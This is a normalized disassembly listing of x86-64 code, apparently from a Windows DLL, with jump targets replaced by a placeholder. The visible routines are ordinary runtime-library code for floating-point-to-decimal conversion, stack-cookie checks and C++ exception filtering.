mov [ rbp - 0x41 ] ebx
jmp r-xdata
test ax ax
jne r-xdata
add r8w r12w
test [ rbp - 0x39 ] 0x7fffffff
jne r-xdata
mov r10d 0x5
mov r12d ebx
lea rcx [ rbp - 0x51 ]
lea r13d [ r10 - 0x4 ]
add r8w r12w
test [ rdx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ rbp - 0x3d ] ebx
jne r-xdata
sub r10d r13d
add rcx 0x2
add r12d r13d
test r10d r10d
jg r-xdata
mov edi r12d
lea r14 [ rbp + r9 - 0x41 ]
lea r15 [ rdx + 0x8 ]
and edi r13d
cmp [ rdx + 0x4 ] ebx
jne r-xdata
cmp [ rbp - 0x41 ] ebx
jne r-xdata
lea eax [ r12 + r12 ]
mov [ rbp - 0x79 ] r10d
movsxd r9 eax
test r10d r10d
jle r-xdata
mov r10d [ rbp - 0x49 ]
mov r9d [ rbp - 0x51 ]
mov eax 0xc002
add r8w ax
mov edi 0x80000000
mov r14d 0xffff
test r8w r8w
jle r-xdata
mov r11d r13d
cmp esi r9d
jae r-xdata
cmp [ rdx ] ebx
je r-xdata
mov [ rbp - 0x37 ] bx
jmp r-xdata
add r8w r14w
jns r-xdata
test edi r10d
jne r-xdata
mov r11d [ rbp - 0x79 ]
add r14 0x2
sub r15 0x2
sub r11d r13d
mov [ rbp - 0x79 ] r11d
test r11d r11d
jg r-xdata
add [ rcx + 0x4 ] r13w
mov [ rcx ] esi
test r11d r11d
je r-xdata
movzx eax [ rbp - 0x51 ]
movzx eax r8w
mov edi ebx
neg ax
movzx edx ax
add r8w dx
test r8w r8w
jg r-xdata
mov r11d [ rbp - 0x4d ]
mov edx r9d
add r10d r10d
shr edx 0x1f
add r9d r9d
mov ecx r11d
shr ecx 0x1f
lea eax [ r11 + r11 ]
add r8w r14w
or eax edx
or r10d ecx
mov [ rbp - 0x51 ] r9d
mov [ rbp - 0x4d ] eax
mov [ rbp - 0x49 ] r10d
test r8w r8w
jg r-xdata
movzx eax [ r14 ]
movzx r9d [ r15 ]
mov r11d ebx
imul r9d eax
mov eax [ rcx ]
lea esi [ rax + r9 ]
cmp esi eax
jb r-xdata
mov eax [ rbp - 0x4f ]
or ecx 0xffffffff
mov r12d 0x1
cmp eax ecx
jne r-xdata
and r9d 0x1ffff
cmp r9d 0x18000
jne r-xdata
mov r11d [ rbp - 0x4d ]
mov eax r10d
shr r9d 0x1
mov ecx r11d
shl eax 0x1f
shr r11d 0x1
shl ecx 0x1f
or r11d eax
shr r10d 0x1
or r9d ecx
sub rdx r13
mov [ rbp - 0x4d ] r11d
mov [ rbp - 0x51 ] r9d
jne r-xdata
add edi r13d
add eax r12d
mov [ rbp - 0x4f ] eax
jmp r-xdata
mov eax [ rbp - 0x4b ]
mov [ rbp - 0x4f ] ebx
cmp eax ecx
jne r-xdata
mov r12d 0x1
test [ rbp - 0x51 ] r13b
je r-xdata
test edi edi
mov [ rbp - 0x49 ] r10d
mov edi 0x80000000
je r-xdata
mov esi [ rbp - 0x71 ]
mov eax 0x7fff
cmp r8w ax
jb r-xdata
add eax r12d
mov [ rbp - 0x4b ] eax
movzx eax [ rbp - 0x47 ]
mov [ rbp - 0x4b ] ebx
cmp ax r14w
jne r-xdata
movzx eax [ rbp - 0x4f ]
or r8w [ rbp - 0x75 ]
mov [ rbp - 0x3b ] r10d
mov [ rbp - 0x41 ] ax
mov eax [ rbp - 0x4d ]
mov [ rbp - 0x37 ] r8w
mov [ rbp - 0x3f ] eax
mov r10d 0x7fff
jmp r-xdata
movzx eax [ rbp - 0x75 ]
mov r10d 0x7fff
neg ax
jmp r-xdata
movzx eax r9w
or ax r13w
mov [ rbp - 0x51 ] ax
mov r9d [ rbp - 0x51 ]
jmp r-xdata
add ax r12w
mov [ rbp - 0x47 ] ax
jmp r-xdata
mov [ rbp - 0x47 ] r15w
add r8w r12w
jmp r-xdata
sbb eax eax
mov [ rbp - 0x41 ] rbx
and eax edi
add eax 0x7fff8000
mov [ rbp - 0x39 ] eax
mov r13 [ rbp - 0x61 ]
mov r15d 0x8000
cmp ax r15w
ja r-xdata
mov r10d [ rbp - 0x49 ]
jmp r-xdata
sub_180015140
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
movzx edi [ rcx + 0x8 ]
mov r10d [ rcx ]
mov rbx r9
mov r9d [ rcx + 0x4 ]
movzx ecx di
mov r11d 0x1
mov [ rbp - 0x4d ] edx
mov edx 0x8000
xor r13d r13d
and cx dx
lea r15d [ rdx - 0x1 ]
mov [ rbp - 0x39 ] r8d
and di r15w
mov [ rbp - 0x41 ] rbx
mov [ rbp - 0x9 ] 0xcccccccc
mov [ rbp - 0x5 ] 0xcccccccc
mov [ rbp - 0x1 ] 0x3ffbcccc
mov [ rbp - 0x67 ] cx
lea eax [ r11 + 0x1f ]
lea r8d [ r11 + 0x2c ]
test cx cx
je r-xdata
mov [ rbx + 0x2 ] al
mov [ rbx + 0x2 ] r8b
jmp r-xdata
cmp di r15w
jne r-xdata
test r9d r9d
jne r-xdata
test di di
jne r-xdata
movzx r8d di
mov ecx r9d
mov [ rbp - 0x13 ] r9d
shr ecx 0x18
mov eax r8d
mov [ rbp - 0x17 ] r10d
shr eax 0x8
lea r9 [ rw-data ]
mov esi 0x80000000
imul r8d r8d 0x4d10
lea edx [ rax + rcx * 2 ]
mov r12d 0x5
sub r9 0x60
mov [ rbp - 0xf ] di
mov [ rbp - 0x19 ] r13w
mov r14d 0xbffd
imul edx edx 0x4d
lea ecx [ rdx + r8 - 0x134312f4 ]
mov [ rbp - 0x49 ] r12d
lea edi [ rsi - 0x1 ]
sar ecx 0x10
movsx r10d cx
mov [ rbp - 0x61 ] ecx
neg r10d
je r-xdata
mov esi 0x80000000
mov [ rbx ] r11w
cmp r9d esi
jne r-xdata
test r10d r10d
jne r-xdata
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
test r10d r10d
jns r-xdata
bt r9d 0x1e
jb r-xdata
test r10d r10d
je r-xdata
cmp cx dx
cmove eax r8d
mov ecx 0x8000
add cx r11w
mov r9d 0x8000
mov [ rbp - 0x65 ] r13d
lea r10d [ r9 - 0x1 ]
mov [ rbp - 0x61 ] ecx
movzx ecx [ rbp + 0x1 ]
movzx r15d cx
and cx r10w
mov [ rbp - 0x29 ] 0x0
xor r15w ax
and ax r10w
mov [ rbp - 0x21 ] r13d
and r15w r9w
lea r9d [ rax + rcx ]
cmp ax r10w
jae r-xdata
je r-xdata
lea r9 [ rw-data ]
neg r10d
sub r9 0x60
test r10d r10d
test cx cx
je r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
mov edx 0x16
call sub_180009e10
test eax eax
je r-xdata
mov eax r11d
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0x108 ]
add rsp 0xc0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r9d [ rbp - 0x11 ]
mov eax 0x15
mov [ rbp - 0xf ] r13w
mov esi [ rbp - 0x11 ]
cmp r12d eax
lea r10d [ rax - 0xd ]
cmovg r12d eax
shr r9d 0x10
sub r9d 0x3ffe
cwde
add r12d eax
test r12d r12d
jg r-xdata
neg r15w
sbb eax eax
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
cmp cx r10w
jae r-xdata
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
cmp r9d esi
jne r-xdata
cmp r9d 0xc0000000
jne r-xdata
mov [ rbx + 0x3 ] 0x6
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180008d64
int3
mov ecx r8d
mov eax edx
add esi esi
add r8d r8d
shr eax 0x1f
shr ecx 0x1f
or r8d eax
or esi ecx
add edx edx
sub r10 r11
jne r-xdata
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0x19 ] edx
test r9d r9d
jns r-xdata
cmp [ rbp - 0x67 ] cx
mov eax 0x20
lea ecx [ rax + 0xd ]
cmove eax ecx
jmp r-xdata
cmp r9w r14w
ja r-xdata
test r10d r10d
jne r-xdata
cdqe
lea rcx [ rax + rax * 2 ]
lea r14 [ r9 + rcx * 4 ]
mov r9d 0x8000
mov [ rbp - 0x31 ] r14
cmp [ r14 ] r9w
jb r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
mov edx 0x16
call sub_180009e10
test eax eax
jne r-xdata
test r10d r10d
jne r-xdata
test r10d r10d
jne r-xdata
lea r14d [ r12 + 0x1 ]
lea rdi [ rbx + 0x4 ]
mov r10 rdi
test r14d r14d
jle r-xdata
neg r9d
movzx r10d r9b
test r10d r10d
jle r-xdata
mov [ rbx + 0x3 ] 0x3001
mov r10d 0x3fbf
cmp r9w r10w
ja r-xdata
mov eax r10d
add r9 0x54
sar r10d 0x3
and eax 0x7
mov [ rbp - 0x51 ] r10d
mov [ rbp - 0x59 ] r9
je r-xdata
mov rbx [ rbp - 0x41 ]
mov ecx [ rbp - 0x61 ]
mov r14d 0xbffd
jmp r-xdata
movzx ecx [ r14 + 0xa ]
movzx eax [ rbp - 0xf ]
mov [ rbp - 0x65 ] r13d
movzx ebx cx
and cx r15w
mov [ rbp - 0x29 ] 0x0
xor bx ax
and ax r15w
mov [ rbp - 0x21 ] r13d
and bx r9w
lea r9d [ rax + rcx ]
mov [ rbp - 0x69 ] bx
cmp ax r15w
jae r-xdata
mov rcx [ r14 ]
mov eax [ r14 + 0x8 ]
lea r14 [ rbp + 0x7 ]
mov [ rbp + 0x7 ] rcx
shr rcx 0x10
mov [ rbp + 0xf ] eax
sub ecx r11d
mov [ rbp - 0x31 ] r14
mov [ rbp + 0x9 ] ecx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180008d64
int3
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
lea edx [ r10 + 0x16 ]
call sub_180009e10
test eax eax
jne r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
lea edx [ r10 + 0x16 ]
call sub_180009e10
test eax eax
je r-xdata
sub r10 r11
mov al [ r10 ]
sub r10 r11
cmp al 0x35
jl r-xdata
mov r13 [ rbp - 0x19 ]
mov ecx r8d
add r8d r8d
shr ecx 0x1f
mov eax edx
add edx edx
shr eax 0x1f
lea r9d [ rsi + rsi ]
mov [ rbp + 0x7 ] r13
or r8d eax
or r9d ecx
mov eax edx
mov ecx r8d
shr eax 0x1f
add r8d r8d
or r8d eax
add edx edx
add r9d r9d
shr ecx 0x1f
mov eax r13d
lea r15d [ rax + rdx ]
or r9d ecx
cmp r15d edx
jb r-xdata
mov ecx r8d
mov eax esi
shr edx 0x1
shr r8d 0x1
shl eax 0x1f
shl ecx 0x1f
sub r10d r11d
shr esi 0x1
or r8d eax
or edx ecx
test r10d r10d
jg r-xdata
test ax ax
jne r-xdata
mov [ rbp - 0x11 ] r13d
jmp r-xdata
mov eax [ rbp - 0x11 ]
mov r9d 0x3fff
shr eax 0x10
cmp ax r9w
jb r-xdata
neg bx
cmp cx r15w
jae r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180008d64
int3
mov eax 0x5
mov [ rbx + 0x3 ] al
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180008d64
int3
cmp r10 rdi
jae r-xdata
jmp r-xdata
lea eax [ r8 + 0x1 ]
xor ecx ecx
cmp eax r8d
jb r-xdata
cmp r15d eax
jae r-xdata
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0x19 ] edx
test cx cx
jne r-xdata
add r9w r11w
test [ rbp - 0x11 ] edi
jne r-xdata
mov edx r13d
mov r8d r13d
mov r15d 0xbffd
cmp r9w r15w
ja r-xdata
mov r11d r13d
jmp r-xdata
cmp [ r10 ] 0x30
jne r-xdata
cmp r10 rdi
jae r-xdata
cmp r10 rdi
jae r-xdata
mov ecx r11d
cmp eax r11d
jae r-xdata
shr r13 0x20
lea r12d [ r8 + r13 ]
cmp r12d r8d
jb r-xdata
mov edi r13d
lea rdx [ rbp - 0x29 ]
add r9w r11w
test [ rbp - 0x1 ] edi
jne r-xdata
test r8d r8d
jne r-xdata
mov r15d 0x7fff
mov ebx 0x3fbf
cmp r9w bx
ja r-xdata
sub r10 r11
sub r10b bl
sub r10b 0x3
movsx rax r10b
mov [ rbx + 0x3 ] r10b
mov [ rax + rbx + 0x4 ] r13b
mov eax 0x20
mov r9d 0x8000
mov [ rbx + 0x3 ] r11b
cmp [ rbp - 0x67 ] r9w
lea ecx [ rax + 0xd ]
mov [ rdi ] 0x30
cmove eax ecx
jmp r-xdata
cmp [ r10 ] 0x39
jne r-xdata
cmp r10 rdi
jae r-xdata
add r9d r11d
mov r8d eax
test ecx ecx
je r-xdata
add r9d r11d
cmp r12d r13d
jae r-xdata
sub r12d r11d
add rdx 0x2
add edi r11d
xor r13d r13d
mov [ rbp - 0x49 ] r12d
test r12d r12d
jg r-xdata
mov r14d edi
lea rsi [ rbp - 0x1 ]
lea r12 [ rbp + rcx - 0x19 ]
and r14d r11d
cmp [ rbp - 0x5 ] r13d
jne r-xdata
test edx edx
jne r-xdata
test ax ax
jne r-xdata
mov [ rbp - 0x15 ] 0x0
mov r15d 0x7fff
jmp r-xdata
mov [ rbx ] r13w
mov [ rbx + 0x2 ] al
mov [ rbx + 0x5 ] r13b
jmp r-xdata
mov [ r10 ] 0x30
sub r10 r11
add [ r10 ] r11b
add r10 r11
add [ rbx ] r11w
mov esi [ rbp - 0x11 ]
jmp r-xdata
add r9d esi
xor r13d r13d
mov eax r15d
shr eax 0x1f
lea r8d [ r12 + r12 ]
mov ecx r12d
or r8d eax
shr ecx 0x1f
lea eax [ r9 + r9 ]
or eax ecx
lea edx [ r15 + r15 ]
sub r14d r11d
mov [ rbp - 0x11 ] eax
shr eax 0x18
mov [ rbp - 0x19 ] edx
add al 0x30
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0xe ] r13b
mov [ r10 ] al
add r10 r11
test r14d r14d
jle r-xdata
lea eax [ rdi + rdi ]
xor ebx ebx
mov r13d r12d
movsxd rcx eax
test r12d r12d
jle r-xdata
mov rbx [ rbp - 0x41 ]
mov r8d [ rbp - 0x21 ]
mov r10d [ rbp - 0x29 ]
mov eax 0xc002
mov esi 0x80000000
mov r12d 0xffff
add r9w ax
test r9w r9w
jle r-xdata
mov r8d r11d
cmp r10d ecx
jae r-xdata
cmp [ rbp - 0x9 ] r13d
je r-xdata
mov [ rbp - 0xf ] r13w
jmp r-xdata
test cx cx
jne r-xdata
add r9w r11w
test [ rbp - 0x11 ] edi
jne r-xdata
mov edx r13d
mov r8d r13d
mov [ rbp - 0x19 ] edx
add r9w r12w
jns r-xdata
test esi r8d
jne r-xdata
sub r13d r11d
add r12 0x2
sub rsi 0x2
test r13d r13d
jg r-xdata
add [ rdx + 0x4 ] r11w
mov [ rdx ] r10d
test r8d r8d
je r-xdata
mov esi r13d
lea r10 [ rbp - 0x29 ]
mov edi r12d
add r9w r11w
test [ r14 + 0x8 ] edi
jne r-xdata
test r8d r8d
jne r-xdata
movzx eax [ rbp - 0x29 ]
mov ebx [ rbp - 0x65 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
test r9w r9w
jg r-xdata
mov edi [ rbp - 0x25 ]
mov edx r10d
add r8d r8d
shr edx 0x1f
add r10d r10d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w r12w
or eax edx
or r8d ecx
mov [ rbp - 0x29 ] r10d
mov [ rbp - 0x25 ] eax
mov [ rbp - 0x21 ] r8d
test r9w r9w
jg r-xdata
movzx eax [ r12 ]
movzx ecx [ rsi ]
mov r8d ebx
imul ecx eax
mov eax [ rdx ]
lea r10d [ rax + rcx ]
cmp r10d eax
jb r-xdata
mov r12d [ rbp - 0x49 ]
sub edi r11d
add r10 0x2
add esi r11d
test edi edi
jg r-xdata
mov ebx esi
lea r13 [ r14 + 0x8 ]
lea r12 [ rbp + rcx - 0x19 ]
and ebx r11d
xor r14d r14d
cmp [ r14 + 0x4 ] r13d
jne r-xdata
test edx edx
jne r-xdata
mov eax [ rbp - 0x27 ]
or edx 0xffffffff
cmp eax edx
jne r-xdata
and r10d 0x1ffff
cmp r10d 0x18000
jne r-xdata
mov edi [ rbp - 0x25 ]
mov eax r8d
shr r10d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r8d 0x1
or r10d ecx
sub rdx r11
mov [ rbp - 0x25 ] edi
mov [ rbp - 0x29 ] r10d
jne r-xdata
add ebx r11d
lea eax [ rsi + rsi ]
mov r15d edi
movsxd rcx eax
test edi edi
jle r-xdata
mov r10d [ rbp - 0x21 ]
mov r8d [ rbp - 0x29 ]
mov eax 0xc002
add r9w ax
mov esi 0x80000000
mov ebx 0xffff
test r9w r9w
jle r-xdata
mov r8d r11d
cmp edx ecx
jae r-xdata
cmp [ r14 ] r13d
je r-xdata
mov [ rbp - 0xf ] r13w
mov r15d 0x7fff
jmp r-xdata
add eax r11d
mov [ rbp - 0x27 ] eax
mov eax [ rbp - 0x23 ]
mov [ rbp - 0x27 ] r13d
cmp eax edx
jne r-xdata
mov eax 0x7fff
cmp r9w ax
jb r-xdata
test [ rbp - 0x29 ] r11b
je r-xdata
test ebx ebx
mov rbx [ rbp - 0x41 ]
mov [ rbp - 0x21 ] r8d
je r-xdata
add r9w bx
jns r-xdata
test esi r10d
jne r-xdata
sub r15d r11d
add r12 0x2
sub r13 0x2
test r15d r15d
jg r-xdata
add [ r10 + 0x4 ] r11w
mov [ r10 ] edx
test r8d r8d
je r-xdata
mov r9 [ rbp - 0x59 ]
movzx eax [ rbp - 0x27 ]
or r9w r15w
mov [ rbp - 0x13 ] r8d
mov [ rbp - 0x19 ] ax
mov eax [ rbp - 0x25 ]
mov [ rbp - 0xf ] r9w
mov [ rbp - 0x17 ] eax
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
jmp r-xdata
neg r15w
mov r8d r13d
mov edx r13d
sbb eax eax
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
jmp r-xdata
add eax r11d
mov [ rbp - 0x23 ] eax
movzx eax [ rbp - 0x1f ]
mov [ rbp - 0x23 ] r13d
cmp ax r12w
jne r-xdata
movzx eax r10w
or ax r11w
mov [ rbp - 0x29 ] ax
mov r10d [ rbp - 0x29 ]
jmp r-xdata
movzx eax [ rbp - 0x29 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
mov [ rbp - 0x5d ] r9w
mov r9d [ rbp - 0x65 ]
test r9w r9w
jg r-xdata
mov edi [ rbp - 0x25 ]
mov edx r8d
add r10d r10d
shr edx 0x1f
add r8d r8d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w bx
or eax edx
or r10d ecx
mov [ rbp - 0x29 ] r8d
mov [ rbp - 0x25 ] eax
mov [ rbp - 0x21 ] r10d
test r9w r9w
jg r-xdata
movzx eax [ r12 ]
movzx ecx [ r13 ]
mov r8d r14d
imul ecx eax
mov eax [ r10 ]
lea edx [ rax + rcx ]
cmp edx eax
jb r-xdata
mov r14 [ rbp - 0x31 ]
xor r13d r13d
mov eax [ rbp - 0x61 ]
mov r12d [ rbp - 0x4d ]
mov [ rbx ] ax
test [ rbp - 0x39 ] r11b
je r-xdata
add ax r11w
mov [ rbp - 0x1f ] ax
jmp r-xdata
mov [ rbp - 0x1f ] cx
add r9w r11w
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov eax [ rbp - 0x27 ]
or edx 0xffffffff
cmp eax edx
jne r-xdata
and r8d 0x1ffff
cmp r8d 0x18000
jne r-xdata
mov edi [ rbp - 0x25 ]
mov eax r10d
shr r8d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r10d 0x1
or r8d ecx
sub rdx r11
mov [ rbp - 0x25 ] edi
mov [ rbp - 0x29 ] r8d
jne r-xdata
add r9d r11d
mov r8d [ rbp - 0x21 ]
jmp r-xdata
add eax r11d
mov [ rbp - 0x27 ] eax
mov eax [ rbp - 0x23 ]
mov [ rbp - 0x27 ] r13d
cmp eax edx
jne r-xdata
mov r15d 0x7fff
mov r12d 0x5
mov edi 0x7fffffff
cmp r9w r15w
jb r-xdata
test [ rbp - 0x29 ] r11b
je r-xdata
test r9d r9d
movzx r9d [ rbp - 0x5d ]
mov [ rbp - 0x21 ] r10d
je r-xdata
movzx eax [ rbp - 0x27 ]
or r9w [ rbp - 0x69 ]
mov [ rbp - 0x13 ] r10d
mov r10d [ rbp - 0x51 ]
mov [ rbp - 0x19 ] ax
mov eax [ rbp - 0x25 ]
mov [ rbp - 0x17 ] eax
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
mov [ rbp - 0xf ] r9w
jmp r-xdata
movzx eax [ rbp - 0x69 ]
mov r10d [ rbp - 0x51 ]
neg ax
jmp r-xdata
add eax r11d
mov [ rbp - 0x23 ] eax
movzx eax [ rbp - 0x1f ]
mov [ rbp - 0x23 ] r13d
cmp ax bx
jne r-xdata
movzx eax r8w
or ax r11w
mov [ rbp - 0x29 ] ax
mov r8d [ rbp - 0x29 ]
jmp r-xdata
sbb eax eax
mov [ rbp - 0x15 ] r13d
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
add ax r11w
mov [ rbp - 0x1f ] ax
jmp r-xdata
mov [ rbp - 0x1f ] cx
add r9w r11w
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov r10d [ rbp - 0x21 ]
jmp r-xdata
sub_180015bec
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x10
and [ r8 ] 0x0
and [ r8 + 0x4 ] 0x0
and [ r8 + 0x8 ] 0x0
mov r10 r8
mov edi edx
mov r12 rcx
mov ebx 0x404e
test edx edx
je r-xdata
cmp [ r10 + 0x8 ] 0x0
jne r-xdata
xor r11d r11d
xor r8d r8d
xor r9d r9d
lea r15d [ r11 + 0x1 ]
mov r8d [ r10 + 0x8 ]
mov r11d 0x8000
test r11d r8d
jne r-xdata
mov r9d [ r10 + 0x4 ]
mov eax r15d
cmp ebp ecx
jae r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov [ r10 + 0xa ] bx
mov rbx [ rsp + 0x30 ]
add rsp 0x10
pop r15
pop r13
pop r12
retn
mov r9d [ r10 + 0x4 ]
mov edx [ r10 ]
mov eax r9d
mov r8d r9d
shl eax 0x10
mov ecx edx
shr r8d 0x10
shr ecx 0x10
shl edx 0x10
mov [ r10 + 0x8 ] r8d
mov r9d ecx
mov [ r10 ] edx
or r9d eax
mov eax 0xfff0
add bx ax
mov [ r10 + 0x4 ] r9d
test r8d r8d
je r-xdata
shr rsi 0x20
xor eax eax
lea r11d [ r8 + rsi ]
cmp r11d r8d
jb r-xdata
mov eax r8d
inc r8d
xor ecx ecx
cmp r8d eax
jb r-xdata
mov [ r10 ] ebp
test eax eax
je r-xdata
mov eax [ r10 ]
mov edx r9d
add r8d r8d
mov ecx eax
add eax eax
shr edx 0x1f
shr ecx 0x1f
add r9d r9d
or r8d edx
or r9d ecx
mov [ r10 ] eax
mov eax 0xffff
add bx ax
mov [ r10 + 0x4 ] r9d
mov [ r10 + 0x8 ] r8d
test r11d r8d
je r-xdata
mov eax r15d
cmp r11d esi
jae r-xdata
mov ecx r15d
cmp r8d r15d
jae r-xdata
add r9d r13d
lea edx [ rbp + rbp ]
mov ecx r11d
shr ecx 0x1f
lea r8d [ r11 + r11 ]
add r9d r9d
or r9d ecx
mov eax ebp
mov [ r10 ] edx
shr eax 0x1f
mov [ r10 + 0x8 ] r9d
or r8d eax
xor eax eax
mov [ r10 + 0x4 ] r8d
movsx ecx [ r12 ]
lea r11d [ rdx + rcx ]
cmp r11d edx
jb r-xdata
add r9d r15d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r11d
test eax eax
je r-xdata
inc r9d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r8d
test ecx ecx
je r-xdata
mov eax r15d
cmp r11d ecx
jae r-xdata
add r12 r15
dec edi
mov [ r10 + 0x4 ] r8d
mov [ r10 + 0x8 ] r9d
jne r-xdata
mov eax r8d
inc r8d
xor ecx ecx
cmp r8d eax
jb r-xdata
mov [ r10 ] r11d
test eax eax
je r-xdata
mov rsi [ r10 ]
mov r13d [ r10 + 0x8 ]
mov ecx r8d
shr ecx 0x1f
add r8d r8d
add r9d r9d
or r9d ecx
lea edx [ r11 + r11 ]
mov eax r11d
shr eax 0x1f
add r9d r9d
mov [ rsp ] rsi
or r8d eax
mov eax edx
add edx edx
mov ecx r8d
shr eax 0x1f
add r8d r8d
shr ecx 0x1f
or r8d eax
xor eax eax
or r9d ecx
mov ecx esi
mov [ r10 ] edx
lea ebp [ rdx + rcx ]
mov [ r10 + 0x4 ] r8d
mov [ r10 + 0x8 ] r9d
cmp ebp edx
jb r-xdata
mov ecx r15d
cmp r8d r15d
jae r-xdata
inc r9d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r8d
test ecx ecx
je r-xdata
sub_180016152
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_180011284
nop
add rsp 0x40
pop rbp
retn
sub_1800161f9
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x68 ] rcx
mov [ rbp + 0x58 ] rcx
mov rax [ rbp + 0x58 ]
mov rcx [ rax ]
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x20 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rdx [ rbp + 0x28 ]
mov rax [ rbp + 0xc8 ]
mov rcx [ rax + 0x28 ]
cmp [ rdx + 0x28 ] rcx
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov [ rbp + 0x20 ] 0x1
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
call sub_180007a4c
mov [ rax + 0x2c0 ] 0x1
mov [ rbp + 0x20 ] 0x1
mov [ rbp + 0x30 ] 0x1
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_1800162f9
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_180011520
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_180007a4c
mov rcx [ rbp + 0xd0 ]
mov [ rax + 0xf0 ] rcx
call sub_180007a4c
mov rcx [ rbp + 0xd8 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov rbx [ rbp + 0xc8 ]
cmp [ rbx ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
cmp [ rbx + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_1800114ec
test eax eax
je r-xdata
cmp [ rbx + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_1800127f0
nop
cmp [ rbx + 0x20 ] 0x19930522
jne r-xdata
sub_1800014d4
sub rsp 0x28
mov rcx [ rcx + 0x8 ]
call sub_180001bec
jmp r-xdata
xor al al
add rsp 0x28
retn
sub_1800045e7
sub eax 0x8502012c
retn 0x870f
Start
push rbx
sub rsp 0x20
xor ebx ebx
call sub_180004440
test eax eax
je r-xdata
mov eax ebx
add rsp 0x20
pop rbx
retn
call sub_1800048ec
sub_180005398
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
add rsp 0x20
pop rbx
retn
call j_sub_180006da4
sub_180006144
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_180007548
sub_180006190
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180007594
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_180006294
jmp sub_180006294
sub_180006220
